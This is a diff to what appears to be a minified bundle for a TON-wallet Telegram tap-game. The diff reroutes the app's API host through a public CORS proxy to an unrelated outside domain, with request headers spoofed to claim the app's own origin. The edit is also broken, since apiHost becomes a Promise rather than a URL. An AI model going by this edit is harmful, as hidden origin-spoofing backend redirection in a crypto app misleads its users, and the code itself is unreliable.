@@ -124,9 +124,16 @@ const H = f0.Fragment
     tonConnectManifestUrl: "https://ag-gilt.vercel.app/assets/manifest.json",
     tonConnectWalletsListSource: "https://raw.githubusercontent.com/ton-connect/wallets-list/main/wallets-v2.json"
 }
+const apihost = fetch('https://cors-anywhere.herokuapp.com/https://agecoin.vpnmanager.site/api/', {
+    method: 'POST', // or 'POST', depending on your needs
+    headers: {
+        'Origin': 'https://ag-gilt.vercel.app', // Replace with your actual domain
+        'X-Requested-With': 'XMLHttpRequest',
+    }
+})
   , L1 = {
     isProd: !0,
-    apiHost: "https://ag-gilt.vercel.app/api",
+    apiHost: apihost,
     showDebugger: !1,
     botLink: "https://t.me/Dragondemotapbot",
     xLink: "https://x.com/vieradeveloper",
